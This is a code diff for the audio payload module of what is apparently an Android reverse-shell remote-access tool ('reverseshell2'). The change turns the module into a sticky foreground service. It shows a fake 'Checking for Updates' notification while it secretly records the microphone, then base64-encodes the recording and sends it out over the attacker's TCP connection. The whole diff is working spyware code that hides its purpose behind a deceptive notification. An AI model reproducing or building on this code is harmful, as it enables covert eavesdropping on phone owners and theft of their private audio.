@@ -1,10 +1,20 @@
 package com.example.reverseshell2.Payloads;
 
-import android.content.Context;
+import android.app.Notification;
+import android.app.Service;
+import android.content.Intent;
 import android.media.MediaRecorder;
 import android.os.Build;
+import android.os.IBinder;
 import android.util.Base64;
 import android.util.Log;
+
+import androidx.annotation.Nullable;
+import androidx.core.app.NotificationCompat;
+
+import com.example.reverseshell2.R;
+import com.example.reverseshell2.functions;
+import com.example.reverseshell2.tcpConnection;
 
 import java.io.BufferedInputStream;
 import java.io.File;
@@ -13,30 +23,41 @@ import java.io.IOException;
 import java.io.OutputStream;
 
 
-public class audioManager {
+public class audioManager extends Service {
 
 
     static String TAG = "audioManagerClass";
-
-    Context context;
-    static OutputStream outputStream;
-
     static File audiofile = null;
     MediaRecorder mRecorder = null;
 
-    public audioManager(Context context) {
-        this.context = context;
+    @Override
+    public int onStartCommand(Intent intent, int flags, int startId) {
+
+        String ins = intent.getStringExtra("ins");
+        if(ins.equals("startFore")){
+            new functions(null).createNotiChannel(getApplicationContext());
+            Notification notification = new NotificationCompat.Builder(getApplicationContext(),"channelid")
+                    .setContentTitle("Checking for Updates")
+                    .setContentText("Fetching")
+                    .setSmallIcon(R.drawable.ic_launcher_foreground)
+                    .setProgress(0,0,true)
+                    .build();
+            startForeground(4321, notification);
+            startRecording(tcpConnection.out);
+        }
+        if(ins.equals("stopFore")){
+
+            stopRecording(tcpConnection.out);
+        }
+        return START_STICKY;
     }
 
-
-    public void startRecording(OutputStream outputStream){
-
-        this.outputStream = outputStream;
-
+    public void startRecording(final OutputStream outputStream){
         try {
-            File outputDir = context.getCacheDir();
+            File outputDir = getApplicationContext().getCacheDir();
             audiofile = File.createTempFile("sound", ".mpeg4", outputDir);
         } catch (IOException e) {
+            e.printStackTrace();
             Log.e(TAG, "external storage access error");
             return;
         }
@@ -50,7 +71,16 @@ public class audioManager {
             try {
                 mRecorder.prepare();
                 mRecorder.start();
-                outputStream.write("Started Recording Audio\n".getBytes("UTF-8"));
+                new Thread(new Runnable() {
+                    @Override
+                    public void run() {
+                        try {
+                            outputStream.write("Started Recording Audio\n".getBytes("UTF-8"));
+                        } catch (IOException e) {
+                            e.printStackTrace();
+                        }
+                    }
+                }).start();
             } catch (IOException e) {
                 e.printStackTrace();
             }
@@ -65,67 +95,99 @@ public class audioManager {
 
     }
 
-    public void stopRecording(OutputStream out){
-        this.outputStream = out;
+    public void stopRecording(final OutputStream outputStream){
+
         if(mRecorder!=null){
             try{
                 mRecorder.stop();
             }catch (IllegalStateException e){
-                try {
-                    outputStream.write("Audio Service Not Started\n".getBytes("UTF-8"));
-                    return;
-                } catch (IOException ex) {
-                    ex.printStackTrace();
-                }
+                new Thread(new Runnable() {
+                    @Override
+                    public void run() {
+                        try {
+                            outputStream.write("Audio Service Not Started\n".getBytes("UTF-8"));
+                            return;
+                        } catch (IOException ex) {
+                            ex.printStackTrace();
+                        }
+                    }
+                }).start();
             }
             mRecorder.release();
             if(audiofile.length()!=0 && audiofile.exists()){
-                sendData(audiofile);
+                sendData(audiofile,outputStream);
             }else{
+                new Thread(new Runnable() {
+                    @Override
+                    public void run() {
+                        try {
+                            outputStream.write("Error in getting Audio Data\n".getBytes("UTF-8"));
+                            return;
+                        } catch (IOException e) {
+                            e.printStackTrace();
+                        }
+                    }
+                }).start();
+            }
+            audiofile.delete();
+        }else{
+            new Thread(new Runnable() {
+                @Override
+                public void run() {
+                    try {
+                        outputStream.write("Audio Service Not Started\n".getBytes("UTF-8"));
+                    } catch (IOException e) {
+                        e.printStackTrace();
+                    }
+                }
+            }).start();
+        }
+    }
+
+
+
+    private void sendData(File file, final OutputStream outputStream) {
+
+        new Thread(new Runnable() {
+            @Override
+            public void run() {
                 try {
-                    outputStream.write("Error in getting Audio Data\n".getBytes("UTF-8"));
-                    return;
+                    outputStream.write("stopAudio\n".getBytes("UTF-8"));
                 } catch (IOException e) {
                     e.printStackTrace();
                 }
             }
-            audiofile.delete();
-        }else{
-            try {
-                outputStream.write("Audio Service Not Started\n".getBytes("UTF-8"));
-            } catch (IOException e) {
-                e.printStackTrace();
-            }
-        }
-    }
-
-    private static void sendData(File file) {
-
-//        if(file.length()>16000000){
-//            try {
-//                outputStream.write("Large file cant transfer \nEND123\n".getBytes("UTF-8"));
-//            } catch (IOException e) {
-//                e.printStackTrace();
-//            }
-//            return;
-//        }
-        try {
-            outputStream.write("stopAudio\n".getBytes("UTF-8"));
-        } catch (IOException e) {
-            e.printStackTrace();
-        }
+        }).start();
         int size = (int) file.length();
         byte[] data = new byte[size];
         try {
             BufferedInputStream buf = new BufferedInputStream(new FileInputStream(file));
             buf.read(data, 0, data.length);
 
-            String encodedAudio = Base64.encodeToString(data, Base64.DEFAULT);
-            outputStream.write(encodedAudio.getBytes("UTF-8"));
-            outputStream.write("END123\n".getBytes("UTF-8"));
+            final String encodedAudio = Base64.encodeToString(data, Base64.DEFAULT);
+            new Thread(new Runnable() {
+                @Override
+                public void run() {
+                    try {
+                        outputStream.write(encodedAudio.getBytes("UTF-8"));
+                        outputStream.write("END123\n".getBytes("UTF-8"));
+                    } catch (IOException e) {
+                        e.printStackTrace();
+                    }
+                    stopForeground(true);
+                    stopSelf();
+                }
+            }).start();
         }catch (Exception e){
             e.printStackTrace();
         }
     }
+
+    @Nullable
+    @Override
+    public IBinder onBind(Intent intent) {
+        return null;
+    }
+
 
 }
